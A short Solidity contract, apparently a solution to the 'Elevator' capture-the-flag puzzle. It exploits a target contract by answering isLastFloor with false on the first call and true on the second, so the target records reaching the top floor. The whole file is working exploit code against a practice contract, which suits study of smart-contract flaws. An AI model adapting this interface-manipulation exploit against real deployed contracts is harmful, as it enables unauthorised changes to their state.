// SPDX-License-Identifier: UNLICENSED
import "./Elevator.sol";

contract ElevatorHack {
    Elevator private immutable target;
    uint private countCalls;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(1);
        require(target.top(), "is not top floor");
    }

    function isLastFloor(uint) external returns (bool) {
        countCalls++;
        return countCalls > 1;
    }
}
